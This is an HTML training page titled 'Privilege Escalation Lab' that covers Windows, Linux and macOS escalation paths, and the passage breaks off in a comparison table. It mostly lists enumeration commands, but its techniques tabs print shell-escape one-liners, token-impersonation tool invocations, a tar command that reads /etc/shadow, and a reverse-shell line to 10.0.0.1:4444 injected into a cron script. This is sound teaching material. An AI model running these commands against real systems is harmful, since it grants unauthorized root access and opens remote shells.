<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Privilege Escalation Lab - Hexworth Prime Dark Arts Vault</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --primary: #a855f7;
            --accent: #dc2626;
            --bg: #0a0a0f;
            --surface: #1a1a24;
            --surface-light: #2a2a3a;
            --text: #e0e0e0;
            --text-dim: #a0a0a0;
            --success: #10b981;
            --warning: #f59e0b;
            --border: #3a3a4a;
            --code-bg: #0f0f15;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, var(--bg) 0%, #1a0a2e 100%);
            color: var(--text);
            line-height: 1.6;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        /* Header */
        header {
            background: linear-gradient(135deg, var(--surface) 0%, var(--surface-light) 100%);
            padding: 30px;
            border-radius: 15px;
            border: 2px solid var(--primary);
            margin-bottom: 30px;
            box-shadow: 0 0 30px rgba(168, 85, 247, 0.3);
        }

        h1 {
            font-size: 2.5em;
            background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 10px;
        }

        .subtitle {
            color: var(--text-dim);
            font-size: 1.1em;
        }

        /* Navigation */
        nav {
            background: var(--surface);
            padding: 15px 30px;
            border-radius: 10px;
            margin-bottom: 30px;
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
            border: 1px solid var(--border);
        }

        .nav-btn {
            background: linear-gradient(135deg, var(--primary) 0%, #9333ea 100%);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1em;
            font-weight: 600;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(168, 85, 247, 0.4);
        }

        .nav-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(168, 85, 247, 0.6);
        }

        .nav-btn.active {
            background: linear-gradient(135deg, var(--accent) 0%, #b91c1c 100%);
            box-shadow: 0 4px 15px rgba(220, 38, 38, 0.4);
        }

        /* Progress Bar */
        .progress-container {
            background: var(--surface);
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 30px;
            border: 1px solid var(--border);
        }

        .progress-bar {
            background: var(--surface-light);
            height: 30px;
            border-radius: 15px;
            overflow: hidden;
            position: relative;
            border: 1px solid var(--border);
        }

        .progress-fill {
            background: linear-gradient(90deg, var(--primary) 0%, var(--accent) 100%);
            height: 100%;
            width: 0%;
            transition: width 0.5s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: 600;
            box-shadow: 0 0 20px rgba(168, 85, 247, 0.6);
        }

        /* Section Container */
        .section {
            display: none;
            animation: fadeIn 0.5s ease;
        }

        .section.active {
            display: block;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Cards */
        .card-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .card {
            background: var(--surface);
            padding: 25px;
            border-radius: 12px;
            border: 1px solid var(--border);
            transition: all 0.3s ease;
            cursor: pointer;
        }

        .card:hover {
            border-color: var(--primary);
            box-shadow: 0 0 20px rgba(168, 85, 247, 0.3);
            transform: translateY(-5px);
        }

        .card h3 {
            color: var(--primary);
            margin-bottom: 15px;
            font-size: 1.4em;
        }

        .card p {
            color: var(--text-dim);
            margin-bottom: 15px;
        }

        .severity {
            display: inline-block;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 0.85em;
            font-weight: 600;
            margin-bottom: 10px;
        }

        .severity.critical {
            background: var(--accent);
            color: white;
        }

        .severity.high {
            background: var(--warning);
            color: white;
        }

        .severity.medium {
            background: #3b82f6;
            color: white;
        }

        /* Code Blocks */
        .code-block {
            background: var(--code-bg);
            padding: 20px;
            border-radius: 8px;
            border: 1px solid var(--border);
            margin: 15px 0;
            overflow-x: auto;
            font-family: 'Consolas', 'Monaco', monospace;
            position: relative;
        }

        .code-block code {
            color: #10b981;
            font-size: 0.95em;
            line-height: 1.6;
        }

        .code-header {
            background: var(--surface-light);
            padding: 8px 15px;
            border-radius: 6px 6px 0 0;
            margin: -20px -20px 15px -20px;
            font-weight: 600;
            color: var(--primary);
            border-bottom: 1px solid var(--border);
        }

        /* Privilege Ladder */
        .privilege-ladder {
            background: var(--surface);
            padding: 40px;
            border-radius: 12px;
            border: 1px solid var(--border);
            margin-bottom: 30px;
        }

        .ladder-container {
            display: flex;
            flex-direction: column;
            gap: 20px;
            max-width: 600px;
            margin: 0 auto;
        }

        .ladder-step {
            background: var(--surface-light);
            padding: 20px;
            border-radius: 10px;
            border: 2px solid var(--border);
            position: relative;
            transition: all 0.3s ease;
            cursor: pointer;
        }

        .ladder-step:hover {
            border-color: var(--primary);
            transform: scale(1.02);
        }

        .ladder-step.active {
            border-color: var(--accent);
            background: linear-gradient(135deg, rgba(220, 38, 38, 0.1) 0%, rgba(168, 85, 247, 0.1) 100%);
            box-shadow: 0 0 20px rgba(220, 38, 38, 0.4);
        }

        .ladder-step::after {
            content: '↑';
            position: absolute;
            top: -30px;
            left: 50%;
            transform: translateX(-50%);
            font-size: 2em;
            color: var(--primary);
        }

        .ladder-step:first-child::after {
            display: none;
        }

        .ladder-title {
            font-size: 1.3em;
            font-weight: 600;
            color: var(--primary);
            margin-bottom: 8px;
        }

        .ladder-desc {
            color: var(--text-dim);
            font-size: 0.95em;
        }

        /* Tabs */
        .tab-container {
            background: var(--surface);
            border-radius: 12px;
            border: 1px solid var(--border);
            margin-bottom: 30px;
            overflow: hidden;
        }

        .tab-headers {
            display: flex;
            background: var(--surface-light);
            border-bottom: 2px solid var(--border);
        }

        .tab-header {
            flex: 1;
            padding: 15px 25px;
            cursor: pointer;
            text-align: center;
            font-weight: 600;
            border: none;
            background: transparent;
            color: var(--text-dim);
            transition: all 0.3s ease;
        }

        .tab-header:hover {
            background: rgba(168, 85, 247, 0.1);
            color: var(--text);
        }

        .tab-header.active {
            color: var(--primary);
            background: rgba(168, 85, 247, 0.2);
            border-bottom: 3px solid var(--primary);
        }

        .tab-content {
            display: none;
            padding: 30px;
        }

        .tab-content.active {
            display: block;
        }

        /* Terminal Simulator */
        .terminal {
            background: #000;
            padding: 20px;
            border-radius: 8px;
            border: 2px solid var(--primary);
            font-family: 'Consolas', 'Monaco', monospace;
            margin: 20px 0;
        }

        .terminal-header {
            color: var(--primary);
            margin-bottom: 15px;
            font-weight: 600;
        }

        .terminal-line {
            color: #0f0;
            margin-bottom: 8px;
            line-height: 1.4;
        }

        .terminal-prompt {
            color: var(--accent);
        }

        .terminal-input {
            background: transparent;
            border: none;
            color: #0f0;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 1em;
            width: 100%;
            outline: none;
            margin-top: 10px;
            padding: 5px;
        }

        .terminal-output {
            margin-top: 10px;
            color: #0ff;
        }

        /* Tool Cards */
        .tool-card {
            background: var(--surface);
            padding: 20px;
            border-radius: 10px;
            border: 1px solid var(--border);
            margin-bottom: 15px;
        }

        .tool-name {
            color: var(--primary);
            font-size: 1.2em;
            font-weight: 600;
            margin-bottom: 10px;
        }

        .tool-command {
            background: var(--code-bg);
            padding: 10px 15px;
            border-radius: 6px;
            border: 1px solid var(--border);
            color: var(--success);
            font-family: 'Consolas', 'Monaco', monospace;
            margin: 10px 0;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .tool-command:hover {
            background: var(--surface-light);
            border-color: var(--primary);
        }

        /* Quiz */
        .quiz-container {
            background: var(--surface);
            padding: 30px;
            border-radius: 12px;
            border: 1px solid var(--border);
            margin-bottom: 20px;
        }

        .question {
            margin-bottom: 30px;
        }

        .question h3 {
            color: var(--primary);
            margin-bottom: 15px;
            font-size: 1.2em;
        }

        .options {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .option {
            background: var(--surface-light);
            padding: 15px 20px;
            border-radius: 8px;
            border: 2px solid var(--border);
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .option:hover {
            border-color: var(--primary);
            background: rgba(168, 85, 247, 0.1);
        }

        .option.selected {
            border-color: var(--primary);
            background: rgba(168, 85, 247, 0.2);
        }

        .option.correct {
            border-color: var(--success);
            background: rgba(16, 185, 129, 0.2);
        }

        .option.incorrect {
            border-color: var(--accent);
            background: rgba(220, 38, 38, 0.2);
        }

        .quiz-btn {
            background: linear-gradient(135deg, var(--primary) 0%, #9333ea 100%);
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1.1em;
            font-weight: 600;
            margin-top: 20px;
            transition: all 0.3s ease;
        }

        .quiz-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(168, 85, 247, 0.6);
        }

        .quiz-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        /* Results */
        .results {
            background: linear-gradient(135deg, var(--surface) 0%, var(--surface-light) 100%);
            padding: 40px;
            border-radius: 12px;
            border: 2px solid var(--primary);
            text-align: center;
            margin-top: 30px;
        }

        .results h2 {
            font-size: 2.5em;
            color: var(--primary);
            margin-bottom: 20px;
        }

        .xp-reward {
            font-size: 3em;
            font-weight: 600;
            background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin: 20px 0;
        }

        /* Defense Checklist */
        .checklist {
            background: var(--surface);
            padding: 25px;
            border-radius: 12px;
            border: 1px solid var(--border);
        }

        .checklist-item {
            background: var(--surface-light);
            padding: 15px;
            border-radius: 8px;
            border: 1px solid var(--border);
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 15px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .checklist-item:hover {
            border-color: var(--primary);
        }

        .checklist-item.checked {
            border-color: var(--success);
            background: rgba(16, 185, 129, 0.1);
        }

        .checkbox {
            width: 24px;
            height: 24px;
            border: 2px solid var(--border);
            border-radius: 6px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--success);
            font-weight: 600;
        }

        .checklist-item.checked .checkbox {
            background: var(--success);
            border-color: var(--success);
            color: white;
        }

        /* Path Checker */
        .path-checker {
            background: var(--surface);
            padding: 30px;
            border-radius: 12px;
            border: 1px solid var(--border);
            margin-bottom: 30px;
        }

        .path-input {
            width: 100%;
            padding: 15px;
            background: var(--code-bg);
            border: 2px solid var(--border);
            border-radius: 8px;
            color: var(--text);
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 1em;
            margin-bottom: 15px;
        }

        .path-input:focus {
            outline: none;
            border-color: var(--primary);
        }

        .check-btn {
            background: linear-gradient(135deg, var(--primary) 0%, #9333ea 100%);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1em;
            font-weight: 600;
            transition: all 0.3s ease;
        }

        .check-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(168, 85, 247, 0.6);
        }

        .result-box {
            background: var(--surface-light);
            padding: 20px;
            border-radius: 8px;
            border: 2px solid var(--border);
            margin-top: 20px;
            display: none;
        }

        .result-box.show {
            display: block;
        }

        .result-box.vulnerable {
            border-color: var(--accent);
            background: rgba(220, 38, 38, 0.1);
        }

        .result-box.safe {
            border-color: var(--success);
            background: rgba(16, 185, 129, 0.1);
        }

        /* Responsive */
        @media (max-width: 768px) {
            h1 {
                font-size: 2em;
            }

            .card-grid {
                grid-template-columns: 1fr;
            }

            nav {
                flex-direction: column;
            }

            .tab-headers {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <header>
            <h1>Privilege Escalation Lab</h1>
            <p class="subtitle">Master the art of elevating privileges from user to root/system in Windows, Linux, and macOS environments</p>
        </header>

        <!-- Progress Bar -->
        <div class="progress-container">
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill">0%</div>
            </div>
        </div>

        <!-- Navigation -->
        <nav>
            <button class="nav-btn active" onclick="showSection('overview')">Overview</button>
            <button class="nav-btn" onclick="showSection('visualizer')">Escalation Paths</button>
            <button class="nav-btn" onclick="showSection('techniques')">Techniques</button>
            <button class="nav-btn" onclick="showSection('suid-finder')">SUID Finder</button>
            <button class="nav-btn" onclick="showSection('path-checker')">Path Checker</button>
            <button class="nav-btn" onclick="showSection('tools')">Tools</button>
            <button class="nav-btn" onclick="showSection('defense')">Defense</button>
            <button class="nav-btn" onclick="showSection('quiz')">Assessment</button>
        </nav>

        <!-- Overview Section -->
        <div id="overview" class="section active">
            <div class="card-grid">
                <div class="card">
                    <h3>What is Privilege Escalation?</h3>
                    <p>Privilege escalation is the act of exploiting a bug, design flaw, or configuration oversight to gain elevated access to resources that are normally protected from an application or user.</p>
                    <p><strong>Two Main Types:</strong></p>
                    <ul style="margin-left: 20px; color: var(--text-dim);">
                        <li><strong style="color: var(--primary);">Horizontal:</strong> Access resources of another user at the same privilege level</li>
                        <li><strong style="color: var(--accent);">Vertical:</strong> Gain higher privileges (user → admin/root)</li>
                    </ul>
                </div>

                <div class="card">
                    <h3>Attack Lifecycle</h3>
                    <div class="code-block">
                        <code>1. Initial Access (low privileges)
   ↓
2. Enumeration & Discovery
   ↓
3. Vulnerability Identification
   ↓
4. Exploitation
   ↓
5. Privilege Escalation
   ↓
6. Persistence & Lateral Movement</code>
                    </div>
                </div>

                <div class="card">
                    <h3>Why It Matters</h3>
                    <p>Understanding privilege escalation is crucial for both offensive and defensive security:</p>
                    <ul style="margin-left: 20px; color: var(--text-dim); margin-top: 10px;">
                        <li>Attackers use it to gain full system control</li>
                        <li>Defenders need to identify and remediate weaknesses</li>
                        <li>Critical step in most penetration tests</li>
                        <li>Helps in hardening system configurations</li>
                    </ul>
                </div>
            </div>

            <div class="privilege-ladder">
                <h2 style="text-align: center; color: var(--primary); margin-bottom: 30px;">Privilege Escalation Journey</h2>
                <div class="ladder-container">
                    <div class="ladder-step" onclick="highlightStep(this)">
                        <div class="ladder-title">SYSTEM / ROOT</div>
                        <div class="ladder-desc">Full administrative control - kernel access, all files, all processes</div>
                    </div>
                    <div class="ladder-step" onclick="highlightStep(this)">
                        <div class="ladder-title">Administrator / Sudo</div>
                        <div class="ladder-desc">Elevated privileges - can modify system settings, install software</div>
                    </div>
                    <div class="ladder-step" onclick="highlightStep(this)">
                        <div class="ladder-title">Power User / Staff</div>
                        <div class="ladder-desc">Extended permissions - access to some restricted resources</div>
                    </div>
                    <div class="ladder-step ladder-step.active" onclick="highlightStep(this)">
                        <div class="ladder-title">Standard User</div>
                        <div class="ladder-desc">Limited access - can only modify own files and settings</div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Escalation Paths Visualizer -->
        <div id="visualizer" class="section">
            <div class="tab-container">
                <div class="tab-headers">
                    <button class="tab-header active" onclick="switchTab('windows-paths')">Windows Paths</button>
                    <button class="tab-header" onclick="switchTab('linux-paths')">Linux Paths</button>
                    <button class="tab-header" onclick="switchTab('macos-paths')">macOS Paths</button>
                </div>

                <div id="windows-paths" class="tab-content active">
                    <h2 style="color: var(--primary); margin-bottom: 20px;">Windows Privilege Escalation Paths</h2>
                    <div class="card-grid">
                        <div class="card">
                            <span class="severity critical">Critical</span>
                            <h3>Unquoted Service Paths</h3>
                            <p>Services with unquoted paths containing spaces can be exploited to execute arbitrary code with SYSTEM privileges.</p>
                            <div class="code-block">
                                <div class="code-header">Vulnerable Example</div>
                                <code>C:\Program Files\My Service\service.exe</code>
                            </div>
                            <div class="code-block">
                                <div class="code-header">Exploitation Order</div>
                                <code>C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Service\service.exe</code>
                            </div>
                        </div>

                        <div class="card">
                            <span class="severity critical">Critical</span>
                            <h3>AlwaysInstallElevated</h3>
                            <p>If both registry keys are enabled, MSI packages install with SYSTEM privileges regardless of user permissions.</p>
                            <div class="code-block">
                                <div class="code-header">Registry Check</div>
                                <code>HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
AlwaysInstallElevated = 1</code>
                            </div>
                        </div>

                        <div class="card">
                            <span class="severity high">High</span>
                            <h3>DLL Hijacking</h3>
                            <p>Applications loading DLLs from insecure locations can be exploited by placing malicious DLLs in the search path.</p>
                            <div class="code-block">
                                <div class="code-header">DLL Search Order</div>
                                <code>1. Application directory
2. System32 directory
3. System directory
4. Windows directory
5. Current directory
6. PATH directories</code>
                            </div>
                        </div>

                        <div class="card">
                            <span class="severity high">High</span>
                            <h3>Scheduled Tasks Abuse</h3>
                            <p>Scheduled tasks running with elevated privileges but pointing to modifiable scripts or executables.</p>
                            <div class="code-block">
                                <div class="code-header">Enumeration</div>
                                <code>schtasks /query /fo LIST /v
Get-ScheduledTask | Get-ScheduledTaskInfo</code>
                            </div>
                        </div>

                        <div class="card">
                            <span class="severity critical">Critical</span>
                            <h3>Token Impersonation</h3>
                            <p>SeImpersonatePrivilege allows processes to impersonate tokens of other users, potentially escalating to SYSTEM.</p>
                            <div class="code-block">
                                <div class="code-header">Check Privileges</div>
                                <code>whoami /priv</code>
                            </div>
                        </div>

                        <div class="card">
                            <span class="severity medium">Medium</span>
                            <h3>Unattended Installations</h3>
                            <p>Configuration files left from automated installations may contain plaintext credentials.</p>
                            <div class="code-block">
                                <div class="code-header">Common Locations</div>
                                <code>C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\System32\sysprep\unattend.xml</code>
                            </div>
                        </div>
                    </div>
                </div>

                <div id="linux-paths" class="tab-content">
                    <h2 style="color: var(--primary); margin-bottom: 20px;">Linux Privilege Escalation Paths</h2>
                    <div class="card-grid">
                        <div class="card">
                            <span class="severity critical">Critical</span>
                            <h3>SUID/SGID Binaries</h3>
                            <p>Binaries with SUID/SGID bits set run with the owner's privileges, potentially allowing escalation if misconfigured.</p>
                            <div class="code-block">
                                <div class="code-header">Find SUID Binaries</div>
                                <code>find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null</code>
                            </div>
                            <div class="code-block">
                                <div class="code-header">Find SGID Binaries</div>
                                <code>find / -perm -2000 -type f 2>/dev/null</code>
                            </div>
                        </div>

                        <div class="card">
                            <span class="severity critical">Critical</span>
                            <h3>Sudo Misconfigurations</h3>
                            <p>Overly permissive sudo configurations allow users to run commands as root without proper restrictions.</p>
                            <div class="code-block">
                                <div class="code-header">Check Sudo Rights</div>
                                <code>sudo -l</code>
                            </div>
                            <div class="code-block">
                                <div class="code-header">Dangerous Example</div>
                                <code>user ALL=(ALL) NOPASSWD: /usr/bin/vim</code>
                            </div>
                        </div>

                        <div class="card">
                            <span class="severity high">High</span>
                            <h3>Cron Job Exploitation</h3>
                            <p>Scheduled tasks running as root with world-writable scripts or in writable directories can be hijacked.</p>
                            <div class="code-block">
                                <div class="code-header">Cron Locations</div>
                                <code>/etc/crontab
/etc/cron.d/*
/var/spool/cron/crontabs/*
crontab -l</code>
                            </div>
                        </div>

                        <div class="card">
                            <span class="severity critical">Critical</span>
                            <h3>Kernel Exploits</h3>
                            <p>Outdated kernels may contain exploitable vulnerabilities allowing privilege escalation to root.</p>
                            <div class="code-block">
                                <div class="code-header">Check Kernel Version</div>
                                <code>uname -a
cat /proc/version
lsb_release -a</code>
                            </div>
                        </div>

                        <div class="card">
                            <span class="severity medium">Medium</span>
                            <h3>PATH Variable Manipulation</h3>
                            <p>If scripts use relative paths and PATH is modifiable, malicious binaries can be executed with elevated privileges.</p>
                            <div class="code-block">
                                <div class="code-header">Exploitation</div>
                                <code>export PATH=/tmp:$PATH
# Create malicious binary in /tmp</code>
                            </div>
                        </div>

                        <div class="card">
                            <span class="severity high">High</span>
                            <h3>Capabilities Abuse</h3>
                            <p>Linux capabilities allow fine-grained privilege control. Misconfigured capabilities can lead to escalation.</p>
                            <div class="code-block">
                                <div class="code-header">List Capabilities</div>
                                <code>getcap -r / 2>/dev/null</code>
                            </div>
                            <div class="code-block">
                                <div class="code-header">Dangerous Example</div>
                                <code>/usr/bin/python3 = cap_setuid+ep</code>
                            </div>
                        </div>
                    </div>
                </div>

                <div id="macos-paths" class="tab-content">
                    <h2 style="color: var(--primary); margin-bottom: 20px;">macOS Privilege Escalation Paths</h2>
                    <div class="card-grid">
                        <div class="card">
                            <span class="severity critical">Critical</span>
                            <h3>Dylib Hijacking</h3>
                            <p>macOS applications may load dynamic libraries (dylibs) from insecure locations, similar to DLL hijacking on Windows.</p>
                            <div class="code-block">
                                <div class="code-header">Search Order</div>
                                <code>1. @rpath (runtime search path)
2. @loader_path (loader directory)
3. @executable_path (executable directory)
4. Fallback to system paths</code>
                            </div>
                            <div class="code-block">
                                <div class="code-header">Detection</div>
                                <code>otool -L /path/to/binary
DYLD_PRINT_LIBRARIES=1 /path/to/binary</code>
                            </div>
                        </div>

                        <div class="card">
                            <span class="severity high">High</span>
                            <h3>plist Abuse</h3>
                            <p>Property list files control system behavior. World-writable plists or those in user-controlled directories can be exploited.</p>
                            <div class="code-block">
                                <div class="code-header">LaunchDaemon Locations</div>
                                <code>/Library/LaunchDaemons/
/System/Library/LaunchDaemons/
~/Library/LaunchAgents/</code>
                            </div>
                            <div class="code-block">
                                <div class="code-header">Check Permissions</div>
                                <code>ls -la /Library/LaunchDaemons/
plutil -p /path/to/plist</code>
                            </div>
                        </div>

                        <div class="card">
                            <span class="severity high">High</span>
                            <h3>Sudo Misconfigurations</h3>
                            <p>Similar to Linux, macOS sudo misconfigurations allow command execution as root.</p>
                            <div class="code-block">
                                <div class="code-header">Check Sudo Rights</div>
                                <code>sudo -l
cat /etc/sudoers</code>
                            </div>
                        </div>

                        <div class="card">
                            <span class="severity medium">Medium</span>
                            <h3>TCC Database Abuse</h3>
                            <p>Transparency, Consent, and Control (TCC) database controls app permissions. Modifying it can grant unauthorized access.</p>
                            <div class="code-block">
                                <div class="code-header">TCC Database Location</div>
                                <code>~/Library/Application Support/com.apple.TCC/TCC.db
/Library/Application Support/com.apple.TCC/TCC.db</code>
                            </div>
                        </div>

                        <div class="card">
                            <span class="severity critical">Critical</span>
                            <h3>SUID Binaries</h3>
                            <p>Like Linux, macOS SUID binaries can be exploited if misconfigured.</p>
                            <div class="code-block">
                                <div class="code-header">Find SUID Files</div>
                                <code>find / -perm -4000 -type f 2>/dev/null</code>
                            </div>
                        </div>

                        <div class="card">
                            <span class="severity high">High</span>
                            <h3>Kernel Extensions (kexts)</h3>
                            <p>Loading malicious kernel extensions can provide full system control.</p>
                            <div class="code-block">
                                <div class="code-header">List Loaded Kexts</div>
                                <code>kextstat
kextfind -loaded -b com.apple</code>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Techniques Section -->
        <div id="techniques" class="section">
            <h2 style="color: var(--primary); margin-bottom: 20px;">Technique Comparison Matrix</h2>

            <div class="tab-container">
                <div class="tab-headers">
                    <button class="tab-header active" onclick="switchTab('windows-tech')">Windows Techniques</button>
                    <button class="tab-header" onclick="switchTab('linux-tech')">Linux Techniques</button>
                    <button class="tab-header" onclick="switchTab('comparison-tech')">Side-by-Side</button>
                </div>

                <div id="windows-tech" class="tab-content active">
                    <div class="tool-card">
                        <div class="tool-name">Unquoted Service Path Exploitation</div>
                        <p style="color: var(--text-dim); margin-bottom: 15px;">Exploit services with paths containing spaces but no quotes.</p>
                        <div class="code-block">
                            <div class="code-header">Enumeration</div>
                            <code>wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """</code>
                        </div>
                        <div class="code-block">
                            <div class="code-header">PowerShell Alternative</div>
                            <code>Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notmatch '\"' -and $_.PathName -match ' '} | Select Name, PathName, StartMode</code>
                        </div>
                        <div class="code-block">
                            <div class="code-header">Exploitation Steps</div>
                            <code>1. Identify vulnerable service path
2. Check write permissions on parent directories
3. Place malicious executable in exploitable location
4. Restart service or wait for reboot</code>
                        </div>
                    </div>

                    <div class="tool-card">
                        <div class="tool-name">DLL Hijacking (Robber Tool)</div>
                        <p style="color: var(--text-dim); margin-bottom: 15px;">Identify applications vulnerable to DLL hijacking.</p>
                        <div class="code-block">
                            <div class="code-header">Using Robber</div>
                            <code>robber.exe -d C:\Program Files\VulnerableApp</code>
                        </div>
                        <div class="code-block">
                            <div class="code-header">Manual Detection with Process Monitor</div>
                            <code>1. Run procmon.exe
2. Filter: Result is "NAME NOT FOUND"
3. Filter: Path ends with ".dll"
4. Identify writable locations</code>
                        </div>
                    </div>

                    <div class="tool-card">
                        <div class="tool-name">Token Impersonation</div>
                        <p style="color: var(--text-dim); margin-bottom: 15px;">Leverage SeImpersonatePrivilege to escalate to SYSTEM.</p>
                        <div class="code-block">
                            <div class="code-header">Check for Privilege</div>
                            <code>whoami /priv | findstr "SeImpersonatePrivilege"</code>
                        </div>
                        <div class="code-block">
                            <div class="code-header">Exploitation Tools</div>
                            <code>JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t *
PrintSpoofer.exe -i -c cmd
GodPotato.exe -cmd "cmd /c whoami"</code>
                        </div>
                    </div>
                </div>

                <div id="linux-tech" class="tab-content">
                    <div class="tool-card">
                        <div class="tool-name">SUID Binary Exploitation</div>
                        <p style="color: var(--text-dim); margin-bottom: 15px;">Abuse SUID binaries to execute commands as the file owner (often root).</p>
                        <div class="code-block">
                            <div class="code-header">Find SUID Binaries</div>
                            <code>find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null</code>
                        </div>
                        <div class="code-block">
                            <div class="code-header">Common Exploitable Binaries</div>
                            <code># vim/vi
:set shell=/bin/bash
:shell

# find
find / -exec /bin/bash -p \; -quit

# nmap (older versions)
nmap --interactive
!sh</code>
                        </div>
                        <div class="code-block">
                            <div class="code-header">GTFOBins Reference</div>
                            <code># Always check GTFOBins for exploitation methods
# https://gtfobins.github.io/</code>
                        </div>
                    </div>

                    <div class="tool-card">
                        <div class="tool-name">Sudo Privilege Escalation</div>
                        <p style="color: var(--text-dim); margin-bottom: 15px;">Exploit misconfigured sudo permissions.</p>
                        <div class="code-block">
                            <div class="code-header">Enumerate Sudo Rights</div>
                            <code>sudo -l</code>
                        </div>
                        <div class="code-block">
                            <div class="code-header">Example Exploits</div>
                            <code># If vim is allowed
sudo vim -c ':!/bin/bash'

# If less is allowed
sudo less /etc/profile
!/bin/bash

# If python is allowed
sudo python -c 'import os; os.system("/bin/bash")'</code>
                        </div>
                    </div>

                    <div class="tool-card">
                        <div class="tool-name">Writable Cron Jobs</div>
                        <p style="color: var(--text-dim); margin-bottom: 15px;">Hijack scheduled tasks running with elevated privileges.</p>
                        <div class="code-block">
                            <div class="code-header">Identify Cron Jobs</div>
                            <code>cat /etc/crontab
ls -la /etc/cron.*
crontab -l
cat /var/spool/cron/crontabs/*</code>
                        </div>
                        <div class="code-block">
                            <div class="code-header">Find Writable Scripts</div>
                            <code>find /etc/cron.* -type f -perm -o+w 2>/dev/null</code>
                        </div>
                        <div class="code-block">
                            <div class="code-header">Exploitation</div>
                            <code># Append reverse shell to writable cron script
echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> /path/to/script.sh</code>
                        </div>
                    </div>

                    <div class="tool-card">
                        <div class="tool-name">Capabilities Exploitation</div>
                        <p style="color: var(--text-dim); margin-bottom: 15px;">Abuse Linux capabilities assigned to binaries.</p>
                        <div class="code-block">
                            <div class="code-header">List All Capabilities</div>
                            <code>getcap -r / 2>/dev/null</code>
                        </div>
                        <div class="code-block">
                            <div class="code-header">Dangerous Capabilities</div>
                            <code># cap_setuid - allows changing UID
/usr/bin/python3 = cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# cap_dac_read_search - read any file
tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar</code>
                        </div>
                    </div>
                </div>

                <div id="comparison-tech" class="tab-content">
                    <h3 style="color: var(--primary); margin-bottom: 20px;">Cross-Platform Comparison</h3>
                    <table style="width: 100%; border-collapse: collapse; background: var(--surface); border-radius: 10px; overflow: hidden;">
                        <thead>
                            <tr style="background: var(--surface-light);">
                                <th style="padding: 15px; text-align: left; color: var(--primary); border: 1px solid var(--border);">Attack Vector</th>
                                <th style="padding: 15px; text-align: left; color: var(--primary); border: 1px solid var(--border);">Windows</th>
                                <th style="padding: 15px; text-align: left; color: var(--primary); border: 1px solid var(--border);">Linux</th>
                                <th style="padding: 15px; text-align: left; color: var(--primary); border: 1px solid var(--border);">macOS</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td style="padding: 15px; border: 1px solid var(--border); font-weight: 600;">Privileged Binaries</td>
                                <td style="padding: 15px; border: 1px solid var(--border); color: var(--text-dim);">Services, Tasks</td>
                                <td style="padding: 15px; border: 1px solid var(--border); color: var(--text-dim);">SUID/SGID</td>
                                <td style="padding: 15px; border: 1px solid var(--border); color: var(--text-dim);">SUID/SGID</td>
                            </tr>
                            <tr>
                                <td style="padding: 15px; border: 1px solid var(--border); font-weight: 600;">Library Injection</td>
                                <td style="padding: 15px; border: 1px solid var(--border); color: var(--text-dim);">DLL Hijacking</td>
                                <td style="padding: 15px; border: 1px solid var(--border); color: var(--text-dim);">LD_PRELOAD</td>
                                <td style="padding: 15px; border: 1px solid var(--border); color: var(--text-dim);">Dylib Hijacking</td>
                            </tr>
                            <tr>
                                <td style="padding: 15px; border: 1px solid var(--border); font-weight: 600;">Scheduled Tasks</td>
